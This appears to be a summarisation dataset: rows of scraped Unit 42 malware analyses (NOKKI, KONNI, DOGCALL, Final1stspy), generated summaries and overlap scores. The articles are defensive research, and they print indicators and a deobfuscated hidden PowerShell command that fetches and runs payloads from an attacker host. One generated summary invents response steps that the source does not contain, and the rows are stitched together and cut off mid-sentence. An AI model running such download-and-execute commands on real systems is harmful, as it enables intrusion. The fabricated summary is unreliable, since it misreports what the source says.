acfc72b8d6611dc9cd6a3f1a4484aa0adfb404ad5faaa8b8db5747b0ff05bc22 fe9c17ac036622b2d73466f62b5d095edda2d3b60fa546a48d0bb18f8b11059f 830091904dab92467956b91555bc88fa7e6bbde514b8a90bb078c8a3bb2f39a9 5a28ad479d55275452e892b799c32803f81307079777bb1a5c4d24477206d16b 8440128350e98375b7eff67a147dfe4e85067d67f2ad20d9485f3de246505a5f 275c4e86218915c337d7e37e7caba36cb830512b17353bf9716c4ba6dceb33ed b700207c903e8da41f33f11b69f703324ec79eb56c98b22efaeac0a10447ec44 2aa149a88539e8dd065c8885053a30d269be63d41a5db3f66c1982202761aa75 1a11240d0af108720de1a8a72ceadef102889f4d5679c1a187559d8d98143b0b 3b6be595b4183b473964345090077b1df29b0cace0077047b46174cc09c690e1 620c51f83457d0e8cb985f1aff07c6d4a33da7566297d41af681ae3e5fbd2f80 4c8da690501c0073a3c262a3079d8efac3fea9e2db9c55f3c512589e9364e85c d92282acf3fea66b05a75aba695e98a5ea1cc1151f9e5370f712b69a816bf475 30382c1e7566d59723ff7ef785a1395711be64873dbca6d86691b1f5d86ba29fCoverageThe following new coverage has been developed to detect additional modules used by VPNFilterNew Snort for ndbr:sid:1:47377:1New Clam AV:Unix.Trojan.Vpnfilter_htpx-6596262-0Unix.Trojan.Vpnfilter_ndbr-6598711-0Unix.Trojan.Vpnfilter_netfilter-6599563-0Unix.Trojan.Vpnfilter_nm-6598714-0Unix.Trojan.Vpnfilter_portforwarding-6599587-0Unix.Trojan.Vpnfilter_socks5proxy-6599614-0Unix.Trojan.Vpnfilter_tcpvpn-6606298-0Updated Clam AV:The following ClamAV signatures were updated to improve detection of additional Stage 1 and Stage 2 modules used by VPNFilter:Unix.Trojan.Vpnfilter-6425812-1Unix.Trojan.Vpnfilter-6550592-1";The ITSecurity report states that the VPNFilter malware is designed to allow a remote attacker to access internal networks behind infected devices. It accomplishes this by beaconing to a remote server, which could be set up like a TunTap device to forward packets over the TCP connection. The connection is seen as outbound by network devices, which may help the module bypass simple firewalls or NAT issues. This module is similar in concept to penetration testing software Cobalt Strike's VPN Pivoting. The Winbox Protocol is a proprietary protocol used by MikroTik's Winbox client. It is used to communicate between the Winbox client and the RouterOS operating system.;en;{'r': 0.04664536741214057, 'p': 0.9358974358974359, 'f': 0.0888618371966279};{'r': 0.024622271964185788, 'p': 0.8461538461538461, 'f': 0.04785209297955808};{'r': 0.04600638977635783, 'p': 0.9230769230769231, 'f': 0.08764455174318908}
https://unit42.paloaltonetworks.com/unit42-new-konni-malware-attacking-eurasia-southeast-asia/;New KONNI Malware attacking Eurasia and Southeast Asia;"This post is also available in: ??? (Japanese)IntroductionBeginning in early 2018, Unit 42 observed a series of attacks using a previously unreported malware family, which we have named 'NOKKI'. The malware in question has ties to a previously reported malware family named KONNI, however, after careful consideration, we believe enough differences are present to introduce a different malware family name. To reflect the close relationship with KONNI, we chose NOKKI, swapping KONNI's Ns and Ks.Because of code overlap found within both malware families, as well as infrastructure overlap, we believe the threat actors responsible for KONNI are very likely also responsible for NOKKI. Previous reports stated it was likely KONNI had been in use for over three years in multiple campaigns with a heavy interest in the Korean peninsula and surrounding areas. As of this writing, it is not certain if the KONNI or NOKKI operators are related to known adversary groups operating in the regions of interest, although there is evidence of a tenuous relationship with a group known as Reaper.The latest activity leveraging the NOKKI payload likely targets politically-motivated victims in Eurasia and possibly Southeast Asia. These attacks leverage compromised legitimate infrastructure for both delivery and command and control (C2). These compromised servers are largely located within South Korea. In total, we observed two waves of attacks spanning from early 2018 to at least July 2018 which we were able to cluster via the specific network protocol used for C2. In addition, the decoy documents themselves wer both created and last modified by an author named zeus. The zeus username is a recurring artifact witnessed in all of the discussed attacks in this report.January 2018 AttackThe earliest observed attack delivering NOKKI took place in January 2018. This attack leverages a Microsoft Windows executable file using a PDF icon in an attempt to trick the victim into launching the file. The malware sample contains the properties seen in Table 1:MD5 48f031f8120554a5f47259666fd0ee02 SHA1 02ee6302436250e1cee1e75cf452a127b397be8d SHA256 b8120d5c9c2c889b37aa9e37514a3b4964c6e41296be216b327cdccd2e908311 File Type PE32 executable (GUI) Intel 80386, for MS Windows PDB String C:\Users\zeus\Documents\Visual Studio 2010\Projects\virus-dropper\Release\virus-dropper.pdb Compile Timestamp 2018-01-26 00:14:31 UTC First Encountered 2018-01-26 03:10:12 UTCTable 1 January NOKKI propertiesThe malware is capable of collecting information on the victim machine, dropping, and executing a payload, as well as dropping and opening a decoy document.The malware will collect data from the victim machine and write this information to LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp. The following information is collected from the victim:IP AddressHostnameUsernameDrive InformationOperating System InformationInstalled ProgramsThis specific function shares significant code overlap with the KONNI tool first discovered by Talos.The NOKKI payload is written to %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior being executed in a new process. Persistence is achieved by writing the file path to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svstartup registry key.After being executed and establishing persistence, NOKKI then connects to 101.129.1[.]104 for C2 communication via FTP. This IP does not have a domain name resolution, however, WHOis shows the IP assigned to China Central Television.The decoy document is written to the same file path as the initial dropper, however, the extension is renamed to .pdf and becomes a legitimate document.Based on the decoy document contents and language, the attack may targetCambodian speakers with an interest in Cambodian political matters.Figure 1 shows the decoy document used for this sample:Figure 1 Decoy document for b8120d5c9c2c889b37aa9e37514a3b4964c6e41296be216b327cdccd2e908311April 2018 AttackIn early April 2018, another attack was observed delivering the NOKKI payload. This attack leveraged a malicious executable with an .scr extension that had the original filename referring to the Russian Ministry of Foreign Affairs and its contents can be found online.The file contains the properties as seen in Table 2:MD5 42fbea771f3e0ff04ac0a1d09db2a45e SHA1 2b6b6f24f58072a02f03fa04deaccce04b6bb43b SHA256 9bf634ff0bc7c69ffceb75f9773c198944d907ba822c02c44c83e997b88eeabd File Type PE32 executable (GUI) Intel 80386, for MS Windows PDB String C:\Users\zeus\Documents\Visual Studio 2010\Projects\virus-dropper\Release\virus-dropper.pdb Compile Timestamp 2018-04-04 21:06:26 UTC First Encountered 2018-04-04 12:55:38 UTCTable 2 April NOKKI PropertiesThis sample contained the same PDB string within it as sample from January 2018. Functionally, it was nearly identical in its behavior as the previous attack.Unlike the previously witnessed attack that possibly targeted Cambodian language speakers with an interest in Cambodian political matters, the decoy document used in this attack is written Cyrillic and contains content related to Russian political matters.Once the .scr file is executed, the NOKKI payload is installed onto the victim host which then connects to the IP resolving to a likely compromised but legitimate South Korean science and technology university website.Figure 2 Decoy document for 9bf634ff0bc7c69ffceb75f9773c198944d907ba822c02c44c83e997b88eeabdThe content of the decoy document in Figure 2 is a publicly available. Google Translate roughly translates to the following:About the meeting of the State Secretary - Deputy Minister of Foreign Affairs of Russia GB Karasin and the Director of the Institute of Strategic and Interregional Studies under the President of Uzbekistan, VI NorovA second sample was discovered in April 2018, also written Cyrillic and containing content related to Russian political matters. This file had the following properties as seen in Table 3:MD5 88587c43daff30cd3cc0c913a390e9df SHA1 1cc8ceeef9a2ea4260fae03368a9d07d56e8331b SHA256 07b90088ec02ef6757f6590a62e2a038ce769914139aff1a26b50399a31dcde9 File Type PE32 executable (GUI) Intel 80386, for MS Windows PDB String C:\Users\zeus\Documents\Visual Studio 2010\Projects\virus-dropper\Release\virus-dropper.pdb Compile Timestamp 2018-04-24 16:42:03 UTC First Encountered 2018-04-24 06:34:35 UTCTable 3 Second April NOKKI PropertiesAgain, we see consistency both in the embedded PDB string, as well as the functionality of the sample itself. This particular sample connects to an IP address to which a likely legitimate but compromised website of a research institute in South Korea resolves. This server has also likely been compromised and repurposed by the adversary.May 2018 AttackIn May 2018, Unit 42 observed an attack using malware with a filename of briefinglist.exe being downloaded from the somewhat redacted following URL. Again, it is a likely compromised but legitimate South Korean website and the contents written Cyrillic and containing content related to Russian political matters.http://mail.[removed].co[.]kr/de/de_includes/mail/yandex.ru/download.phpThis sample has the following properties as seen in Table 4:MD5 ae27e617f4197cd30cc09fe784453cd4 SHA1 dc739ca07585eab7394843bc4dba2faca8e5bfe0 SHA256 9b1a21d352ededd057ee3a965907126dd11d13474028a429d91e2349b1f00e10 File Type PE32 executable (GUI) Intel 80386, for MS Windows PDB String C:\Users\zeus\Documents\Visual Studio 2010\Projects\virus-dropper\Release\virus-dropper.pdb Compile Timestamp 2018-04-30 17:48:08 UTCTable 4. Third May NOKKI PropertiesThis sample remains consistent with previous samples of NOKKI in terms of functionality and the embedded PDB string.The payload communicates with 145.14.145[.]32, which resolves to files.000webhost[.]com. This same host was witnessed in previously reported KONNI malware activity.July 2018 AttackIn July 2018, a South Korean engineering organization was identified as compromised and hosting malware and C2 infrastructure on their webserver since at least May 2018. Again, a file in Cyrillic with a name referring to the Russian political matters was being distributed from the http://mail.[removed].co[.]kr/common URL.Unlike attacks leading up to this point, an executable file was not used as the initial malware file. Instead, this attack used a Microsoft Word document leveraging malicious macros to deliver the payload to the victim. Upon opening the file and enabling macros, the document downloaded both the payload and displayed a decoy document referencing political matters.NOKKI Malware FamilyFrom the samples discussed in this blog, we were able to identify two distinct variants of NOKKI. The earlier variant witnessed in attacks between January 2018 to May 2018 made use of FTP for C2 communications. Alternatively, the newer variant witnessed since June 2018 made use of HTTP. While both variants used different network protocols for communication, they both used the same file path structure on the remote C2 server.The older variant begins by looking for the presence of the following file:%TEMP%\ID56SD.tmpIf this file does not exist, the malware will generate a random string of 10 upper-case alphabetic characters. This string will ultimately be used as the victim's identifier. It will also create the %TEMP%\stass file and write the value of a to it.The malware continues to spawn a new thread that is responsible for network communication. Within an infinite loop, this malware will continue connecting to its C2 server via FTP.After successful connection to the C2, it will write the previously written stass file to the server's public_html folder. It will also upload the previously created uplog.tmp file to the remote server. After the upload is completed, NOKKI will then delete the local copy on the infected host. Finally, NOKKI will check for the presence of the [id]-down file on the C2 server, where [id] is the 10 character alphabetic string created prior. Should this file exist, it will be downloaded and written to %TEMP%\svchostav.exe prior to being executed in a new process. After it is executed, the malware deletes the file on the C2 server. The malware will then sleep for 15 minutes between loops.The newer variant operates in a slightly different manner.In this case, NOKKI begins by extracting and dropping an embedded DLL to the %LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll path. One of two DLLs may be dropped, either a 32-bit or a 64-bit compiled options. The appropriate DLL will be dropped based on the victim host's CPU architecture.While these DLLs are different architectures, they perform the same functions. After the DLL is written, the malware loads it via the following command-line:rundll32.exe [%LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll] installFinally, the malware will write the following registry key to ensure persistence on the victim host:HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qivService - C:\\Windows\\System32\\rundll32.exe ""[%LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll]"" installThe payload's install function makes a call to SetWindowsHookEx with a thread ID of 0, resulting in the function being injected into every GUI process running on the victim machine. This particular process is referenced in this forum post.The DllMain function of this payload begins by comparing the process executable name, seeking out the explorer.exe process. In the event it is not loaded in the context of this process, nothing occurs. If the malware is running within explorer.exe, it will load its own HTTPStart exported function, which performs the malicious actions.It begins by writing the ID56SD.tmp file in its current working directory (CWD). A unique randomly chosen 10-byte alphabetic string is written to this file, which will be used as an identifier for the victim. A file named stass is also written in the CWD, with a single byte of a.The payload proceeds to enter an infinite loop, with a 15 minute delay between iterations. The loop begins by reading in the previously written stass file and uploading it to its embedded C2 server via HTTP.The data is encoded with base64 and uploaded via a POST parameter of data. Additionally, the victim's identifier and the current timestamp is uploaded via a POST parameter of subject.Figure 3 HTTP request made by NOKKI payloadAfter this upload request is made, the malware looks for the presence of a file named uplog.tmp. In the event this file exists, it is uploaded via the same method as previously noted. After this file is uploaded via HTTP, the local file is deleted. While this file is not present originally in this malware sample, in other NOKKI variants, it has been observed containing the victim's system information.The malware then looks for the presence of the upfile.tmp file. Again, if this file exists, it is uploaded to the remote server and the local file is deleted.Finally, the malware will look for the presence of the following remote files, where [id] is the victim identifier:http://mail.[removed].co[.]kr/./pds/downhttp://mail.[removed].co[.]kr/./pds/data/[id]-downIf the down file is available, it is written to %TEMP%\wirbiry2jsq3454.exe and executed. If the [id]-down file is available, it is written to %TEMP%\weewyesqsf4.exe and executed.During execution, a remote module was downloaded from the down URL:This module is responsible for collecting the following information and writing it to the %LOCALAPPDATA%\MicroSoft UpdateServices\uplog.tmp file:IP AddressHostnameUsernameDrive InformationOperating System InformationInstalled ProgramsThis module acted in an identical way as the information collection function witnessed in the older variant of NOKKI.Comparison to KONNIThe NOKKI malware family differs from KONNI in a number of ways. Unlike KONNI, NOKKI is modular in nature, with multiple steps taken between the initial infection and the final payload(s) being delivered. Early versions of NOKKI observed between January 2018 to May 2018 used a remote FTP server to ultimately accept commands and download additional modules. While newer versions of NOKKI starting in June 2018 use HTTP, the communication is quite different from the previously reported KONNI malware, both in the URI structure and data being sent. In addition, while the KONNI samples used C2 infrastructure set up specifically by the adversary, NOKKI mostly leveraged what appeared to be likely compromised legitimate servers for their infrastructure.NOKKI URIs Previously Reported KONNI URIs /./pds/data/upload.php /login.php /./pds/data/[victim_id]-down /upload.php /./pds/down /download.php /common/exe /weget/uploadtm.php /common/doc /weget/upload.phpTable 5. URI differences between NOKKI and KONNIWhile we consider these malware families to be separate, we identified some similarities with KONNI. In addition to overlapping infrastructure between KONNI and NOKKI, a NOKKI module used to collect victim information was observed exhibiting very similar characteristics to the KONNI victim information collection function as seen in Figure 4. This same function was also observed in early instances of the dropper used to deploy NOKKI between January 2018 and May 2018.Figure 4 Similarities between KONNI malware family and NOKKI moduleBased on the similarities witnessed, we think it is highly probable there is some amount of code sharing and likely a single adversary group involved.ConclusionThe adversary operating the NOKKI malware family appears to have begun using NOKKI in January 2018 and has continued their activity through 2018. At this time, we can only speculate who these series of attacks may be attributed to based on tenuous relationships. However, there is significant evidence from our attack telemetry and victimology indicating the operator has a strong interest in specific regions of the world such as Eurasia, the Korean Peninsula, and Southeast Asia. The general tactics used to deliver NOKKI are similar in nature to the actors behind a previously identified malware, KONNI. Additionally, there are overlaps both in code and some infrastructure with previously reported KONNI activity. Unlike KONNI, however, this particular malware family makes use of compromised servers for both hosting and C2 operations.The NOKKI malware itself has been updated in the short period of time it has been observed, moving from FTP to HTTP for C2 operations. The malware is modular in nature, and based on analysis of the information gathering module, it is highly likely the NOKKI operators are the same as the KONNI operators. Unit 42 will continue to monitor this malware family and the threat actor responsible.Palo Alto Networks customers are protected by the following:All known samples of NOKKI maintain a malware verdict in WildFireAutoFocus customers may learn more via the NOKKI tagAppendixIndicators of CompromiseJuly 2018 AttackIndicator Type Indicator Hash d92c94423ec3d01ad584a74a38a2e817449648a4da3f12d345c611edc5c4cdbd Hash dce53e59b0c48e269dadc766a78667a14f11b72c49f57d95abde62c84ac8d7ae Hash 0657f788e89a437a1e6fe2630c19436736aa55dcf255540698864a7576192611 Hash d211815177ce4b9fd2d3c258d2fc6282c23b8458d71f8f6f0df06a9dda89c12f Process rundll32.exe [%LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll] install Registry Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qivService File ID56SD.tmp File stass File %LOCALAPPDATA%\MicroSoft UpdateServices\uplog.tmp File %TEMP%\wirbiry2jsq3454.exe File %TEMP%\weewyesqsf4.exe URL hxxp://mail.[removed].co[.]kr/./pds/data/upload.php URL hxxp://mail.[removed].co[.]kr/./pds/down URL hxxp://mail.[removed].co[.]kr/./pds/data/[id]-down URL hxxp://mail.[removed].co[.]kr/common URL hxxp://mail.[removed].co[.]kr/common/exe URL hxxp://mail.[removed].co[.]kr/common/docJune 2018 AttackIndicator Type Indicator Hash 5137f6a59c2c7a54f1a5fc9a9650972b17d52dd0e203f5abefedf5c593c41ff0 Hash fd673703c502be907919a4ff2922b7b969d96d206abc572a5cb83e69ab32ca18 Hash 4e84f97bb61c2d373a574676fa374131460839ecc7b53064f558ce7ce55528ad Hash fd673703c502be907919a4ff2922b7b969d96d206abc572a5cb83e69ab32ca18 Hash 74ddd56b1e33aa3752f143a77e5802a5803fd2c222f2cca77bfa5c740dfc8f5e Process rundll32.exe [%LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll] install Registry Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qivService File ID56SD.tmp File stass File uplog.tmp File %TEMP%\wirbiry2jsq3454.exe File %TEMP%\weewyesqsf4.exe URL hxxp://mail.[removed].co[.]kr/./pds/data/upload.php URL hxxp://mail.[removed].co[.]kr/./pds/down URL hxxp://mail.[removed].co[.]kr/./pds/data/[id]-down URL hxxp://mail.[removed].co[.]kr/commonMay 2018 AttackIndicator Type Indicator Hash 9b1a21d352ededd057ee3a965907126dd11d13474028a429d91e2349b1f00e10 Hash c3172b403068aabc711b7cbe4d923ae1fa705ce11c4cc71271fde83ce751c21c Folder %LOCALAPPDATA\MicroSoft Update1 File %LOCALAPPDATA\MicroSoft Update1\svServiceUpdate.exe File %TEMP%\uplog.tmp File %STARTUP%\Antdule.lnk File %TEMP%\ID56SD.tmp File %TEMP%\svchostav.exe URL hxxp://mail.[removed].co[.]kr/de/de_includes/mail/yandex.ru/download.phpApril 2018 AttackIndicator Type Indicator Hash 07b90088ec02ef6757f6590a62e2a038ce769914139aff1a26b50399a31dcde9 Hash d5fc0ef2d1ed037b5b6389882f9bb4ea15a6b41f21cdc0f5e90752f4e687445c Folder %LOCALAPPDATA\MicroSoft Update1 File %LOCALAPPDATA\MicroSoft Update1\svServiceUpdate.exe File %TEMP%\uplog.tmp File %STARTUP%\Antdule.lnk File %TEMP%\ID56SD.tmp File %TEMP%\svchostav.exe URL hxxp://mail.[removed].co[.]kr/de/de_includes/mail/yandex.ru/download.php IP Address 210.112.239[.]74Early April 2018 AttackIndicator Type Indicator Hash 9bf634ff0bc7c69ffceb75f9773c198944d907ba822c02c44c83e997b88eeabd Hash c07bea0928a35b9292eebab32563378d01d95434d098e5c7c076e94866a14212 Folder %LOCALAPPDATA\MicroSoft Update1 File %LOCALAPPDATA\MicroSoft Update1\svServiceUpdate.exe File %TEMP%\uplog.tmp File %STARTUP%\Antdule.lnk File %TEMP%\ID56SD.tmp File %TEMP%\svchostav.exe URL hxxp://mail.[removed].co[.]kr/de/de_includes/mail/yandex.ru/download.php IP Address 141.223.125[.]112January 2018 Attack";The malware is capable of collecting information on the victim machine, dropping, and executing a payload, as well as dropping and opening a decoy document. The malware will collect data from the victim: IP Address, Hostname, Username, Drive Information, Operating System Information, Installed Programs. This specific function shares significant code overlap with the KONNI tool first discovered by Talos. The NOKKI payload is written to %LOCALAPPDATA%\MicroSoft Updatea\svServiceUpdate.exe prior being executed in a new process. Persistence is achieved by writing the file path to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run\svstartup registry key. After being executed and establishing persistence, NOKKI then connects to 101.129.1[. ]104 for C2 communication via FTP. Unit 42 responded to the observed malicious activity by taking the following steps: 1. Identifying the compromised South Korean engineering organization. 2. Identifying the malicious macros used in the Word document. 3. Identifying the C2 infrastructure used by the adversary. 4. Analyzing the malicious macros used in the Word document. 5. Analyzing the C2 infrastructure used by the adversary. 6. Monitoring the malicious macros used in the Word document. 7. Monitoring the C2 infrastructure used by the adversary. The NOKKI malware family is a sophisticated threat that uses a variety of techniques to infect its victims. The malware begins by looking for the presence of the ID56SD.tmp file. If this file does not exist, the malware will generate a random string of 10 uppercase alphabetic characters. This string will ultimately be used as the victim's identifier. It will also create the %TEMP%\stass file and write the value of a to it. The malware continues to spawn a new thread that is responsible for network communication. Within an infinite loop, this malware will continue connecting to its C2 server via FTP. After successful connection to the C2, it will write the previously written stass file to the server's public_html folder. It will also upload the previously created uplog.tmp file to the remote server. After the upload is completed, NOKKI will then delete the local copy on the infected host. Finally, NOKKI will check for the presence of the [id]down file on the C2 server, where [id] is the 10 character alphabetic string created prior. Should this file exist, it will be downloaded and written to %TEMP%\svchostav.exe prior to being executed in a new process. After it is executed, the malware deletes the file on the C2 server. The malware will then sleep for 15 minutes between loops. The NOKKI malware family differs from KONNI in a number of ways. Unlike KONNI, NOKKI is modular in nature, with multiple steps taken between the initial infection and the final payload(s) being delivered. Palo Alto Networks customers are protected by the following:All known samples of NOKKI maintain a malware verdict in WildFireAutoFocus customers may learn more via the NOKKI tagAppendixIndicators of CompromiseJuly 2018 AttackIndicator Type Indicator Hash d92c94423ec3d01ad584a74a38a2e817449648a4da3f12d345c611edc5c4cdbd Hash dce53e59b0c48e269dadc766a78667a14f11b72c49f57d95abde62c84ac8d7ae Hash 0657f788e89a437a1e6fe2630c19436736aa55dcf255540698864a7576192611 Hash d211815177ce4b9fd2d3c258d2fc6282c23b8458d71f8f6f0df06a9dda89c12f Process rundll32.exe [%LOCALAPPDATA%\MicroSoft UpdateServices\Services.dll] install Registry Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\qivService File ID56SD.tmp File stass File %LOCALAPPDATA%\MicroSoft UpdateServices\uplog.tmp File %TEMP%\wirbiry2jsq34 The ITSecurity report has been successfully summarized.;en;{'r': 0.26674364896073904, 'p': 0.8918918918918919, 'f': 0.4106666631222677};{'r': 0.17873651771956856, 'p': 0.8188235294117647, 'f': 0.29342326855943357};{'r': 0.2644341801385681, 'p': 0.8841698841698842, 'f': 0.4071111075667121}
https://unit42.paloaltonetworks.com/unit42-nokki-almost-ties-the-knot-with-dogcall-reaper-group-uses-new-malware-to-deploy-rat/;NOKKI Almost Ties the Knot with DOGCALL: Reaper Group Uses New Malware to Deploy RAT;"This post is also available in: ??? (Japanese)Recently, Unit 42 identified the NOKKI malware family that was used in attacks containing politically-motivated lures targeting Russian and Cambodian speaking individuals or organizations. As part of this research, an interesting tie was discovered to the threat actor group known as Reaper.The Reaper group has been publicly attributed to North Korea by other security organizations, targeting organizations that align with the interests of this country. Such targeted organizations include the military and defense industry within South Korea, as well as a Middle Eastern organization that was doing business with North Korea. Part of this group's modus operandi includes the use of a custom malware family called DOGCALL. DOGCALL is a remote access Trojan (RAT) that uses third-party hosting services to upload data and accept commands. At the time of publication, we observe this particular malware family in use by the Reaper threat actor group only.This blog details the relationship found between the NOKKI and DOGCALL malware families, as well provides additional information about a previously unreported malware family used to deploy DOGCALL, which we have named Final1stspy based on a pdb string in the malware.Tying the KnotWhile researching the NOKKI malware threat, Unit 42 discovered the most recent cluster of attacks beginning in July 2018 leveraged malicious macros within a Microsoft Word document. These particular macros were not overly complex in nature, and simply would attempt to perform the following actions:Download and run an executable malware payload. Download and open a Microsoft Word decoy document.To avoid detection, the macros employ simple obfuscation of interesting strings that ultimately just used base64 encoding. However, it used a somewhat unusual method where it would first convert the base64-encoded text into hex, and then convert that hex into a text string.Figure 1 Malicious macro downloading remote payload and executing it (comments added by Unit 42 for clarity)Figure 2 Malicious macro implementing unique deobfuscation scheme (comments added by malware authorBy searching on this unique deobfuscation technique present in all samples delivering NOKKI, a single other file was identified. This file had the following properties:MD5 e02024f38dfb6290ce0d693539a285a9 SHA1 d13fc918433c705b49db74c91f56ae6c0cb5cf8d SHA256 66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51 Creator Windows User Created Date 2018-03-19 07:58:00 UTC Last Modified Date 2018-06-16 14:19:00 UTC Original Filename World Cup predictions.docBased on the original filename, we can surmise this malware sample targeted individuals interested in the World Cup hosted in Russia in 2018. As we can see in the figure below, the unique deobfuscation routine used between the samples is identical, including the comments included by the author.Figure 3 Similarities between NOKKI dropper and World Cup predictions dropperWhile the deobfuscation routine was identical, the actual functionality of the macro differed slightly. The NOKKI dropper samples downloaded both a payload and a decoy document, but this World Cup predictions malware sample downloads and executes a remote VBScript file wrapped in HTML and appends text to the original Word document to provide the lure for the victim.The lure in question includes the below text from a publicly available article written on ESPN in the UK:""Peru and Denmark face off in the third match, and this time it doesn't seem as one sided. Four people go for a Peru victory, three for Denmark and three for the draw.Last but not least, we get to see Croatia and Nigeria for the first time. Our Nigeria expert, Colin, reckons there will be plenty of goals and a 3-2 win for his side -- the only person to back the Super Eagles.Check out how our pundits got on with their predictions for following games and remember to join the pundits' league in Match Predictor.We've got our top talent on hand from England, the United States, Mexico, Brazil, Argentina, Colombia, Australia, and Africa -- many of whom will be based out in Russia for the tournament -- to analyze each and every one of the 64 matches.We'll score our experts just as we do in the Match Predictor -- 10 points for correct result, with a bonus 20 points for getting the score line right too.""Interestingly enough, two commented out lures were also included in this document. One simply contains the phrase of ""I miss u."", but the second lure contains text from a publicly available article online discussing a visit by the North Korean leader to Singapore, shown below.""This aircraft seems to have conveyed a North Korean advance team including diplomats and security personnel.The 747-400, which just landed in Singapore, was apparently used to fly Kim and his personal aides to the summit.This would also be consistent with our previous reporting that North Korea had settled on such a plan.The Jumbo Jet in question is quite special. B-2447 is used by the top rungs of the Chinese government, predominantly President Xi Jinping and his entourage, when traveling abroad.It is capable of being specially outfitted with a VIP interior and has special interfaces for secure satellite communications among other modifications.With this in mind, it wasn't surprising seeing it being used as 'Kim Force One' for this special mission.""When the chain of execution completes on the World Cup predictions.doc file, a DOGCALL malware sample is executed on the victim machine.The commented lure and payload used by the malware provides an interesting detail given that DOGCALL has been attributed to the threat actor group known as Reaper, which has been attributed to North Korea by other security organizations.Continuing Execution of the MalwareAfter the initial execution of World Cup predictions.doc is run, it proceeds to download a VBScript file from the following URL:http:// kmbr1.nitesbr1[.]org/UserFiles/File/image/home.htmlThis VBScript file yet again contains the exact same unique deobfuscation routine that was previously discussed. When this second stage VBScript file executes, it begins by writing the following data to %APPDATA%\Microsoft\mib.dat. This file will later be used by the Final1stspy malware family, which we discuss later in this post.1111:rom*E8FEF0CDF6C1EBBA90794B2BAfter this file is written, it will execute the following (deobfuscated):objShell.Run ""cmd.exe /k powershell.exe"" & "" "" & ""-windowstyle"" & "" "" & ""hidden"" & "" "" & ""-ExecutionPolicy Bypass"" & "" "" & ""$h='%APPDATA%/Microsoft/Windows/msvcrt32.dll'"" & "","" & ""$f='%APPDATA%/Microsoft/ieConv.exe'"" & "","" & ""$x='"" & ""http://"" & ""kmbr1.nitesbr1.org"" & ""/UserFiles/File/image/images/happy.jpg"" & ""',"" & ""$t='"" & ""http://"" & ""kmbr1.nitesbr1[.]org"" & ""/UserFiles/File/image/images/wwwtest.jpg"" & ""',"" & ""("" & ""New-Object System.Net.WebClient"" & "")"" & "".DownloadFile($t,$f)"" & "","" & ""("" & ""New-Object System.Net.WebClient"" & "")"" & "".DownloadFile($x,$h)"" & "","" & ""Start-Process $f"" & "","" & ""Stop-Process"" & "" "" & ""-processname"" & "" "" & ""cmd"", 0 1 objShell . Run ""cmd.exe /k powershell.exe"" & "" "" & ""-windowstyle"" & "" "" & ""hidden"" & "" "" & ""-ExecutionPolicy Bypass"" & "" "" & ""$h='%APPDATA%/Microsoft/Windows/msvcrt32.dll'"" & "","" & ""$f='%APPDATA%/Microsoft/ieConv.exe'"" & "","" & ""$x='"" & ""http://"" & ""kmbr1.nitesbr1.org"" & ""/UserFiles/File/image/images/happy.jpg"" & ""',"" & ""$t='"" & ""http://"" & ""kmbr1.nitesbr1[.]org"" & ""/UserFiles/File/image/images/wwwtest.jpg"" & ""',"" & ""("" & ""New-Object System.Net.WebClient"" & "")"" & "".DownloadFile($t,$f)"" & "","" & ""("" & ""New-Object System.Net.WebClient"" & "")"" & "".DownloadFile($x,$h)"" & "","" & ""Start-Process $f"" & "","" & ""Stop-Process"" & "" "" & ""-processname"" & "" "" & ""cmd"" , 0This executed code simply downloads two files from http:// kmbr1.nitesbr1[.]org/UserFiles/File/images/happy.jpg and http:// kmbr1.nitesbr1[.]org/UserFiles/File/images/wwwtest.jpg and stores them in %APPDATA%/Microsoft/Windows/msvcrt32.dll and %APPDATA%/Microsoft/ieConv.exe, respectively. Finally, the VBScript file will execute the previously downloaded ieConv.exe file in a new process.These two files are instances of a previously unreported dropper malware family that we are calling Final1stspy.Overview of Final1stspyAs previously stated, the Final1stspy malware family is split between an executable file and a DLL. These files have the following properties (Note: the DLL information is provided after it is decrypted by the malware):MD5 0f1d3ed85fee2acc23a8a26e0dc12e0f SHA1 3d161de48d3f4da0aefff685253404c8b0111563 SHA256 fb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3a File Type PE32 executable (GUI) Intel 80386, for MS Windows Filename wwwtest.jpg Compile Timestamp 2018-06-01 15:52:41 UTC PDB String E:\Final Project(20180108)\Final1stspy\LoadDll\Release\LoadDll.pdbMD5 a2fe5dcb08ae8b72e8bc98ddc0b918e7 SHA1 741dbdb20d1beeb8ff809291996c8b78585cb812 SHA256 0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9a File Type PE32 executable (DLL) (GUI) Intel 80386, for MS Windows Filename happy.jpg Compile Timestamp 2018-06-17 17:04:15 UTC PDB String E:\Final Project(20180108)\Final1stspy\hadowexecute - Copy\Release\hadowexecute.pdbAs we can see, both samples were compiled within a couple weeks of each other. Additionally, the original Microsoft Word document used to deliver this malware was last modified roughly a day before the DLL was compiled.Both the executable and DLL make use of a specific routine to obfuscate strings of importance. The following code, written in Python, decodes these strings:import base64 data = ""[Obfuscated String]"" dataDecoded = b64decode(data) outVar = """" for char in dataDecoded: outVar += chr(((ord(char) + 122) ^ 0x19) & 0xff) print(outVar) 1 2 3 4 5 6 7 8 import base64 data = ""[Obfuscated String]"" dataDecoded = b64decode ( data ) outVar = """" for char in dataDecoded : outVar += chr ( ( ( ord ( char ) + 122 ) ^ 0x19 ) & 0xff ) print ( outVar )The Final1stspy malware begins by looking for the presence of the following file:%APPDATA%\Microsoft\Windows\msvcrt64.dllShould this file be present, the malware will load the DLLs and attempt to call the exported main_func function.Otherwise, the malware will look for the following file:%APPDATA%\Microsoft\Windows\msvcrt32.dllIn the event this file is present, the malware will decrypt this file by XORing it against 0x50, write it to the previously mentioned msvcrt64.dll path, and load the main_func function.This DLL uses the same string obfuscation routine 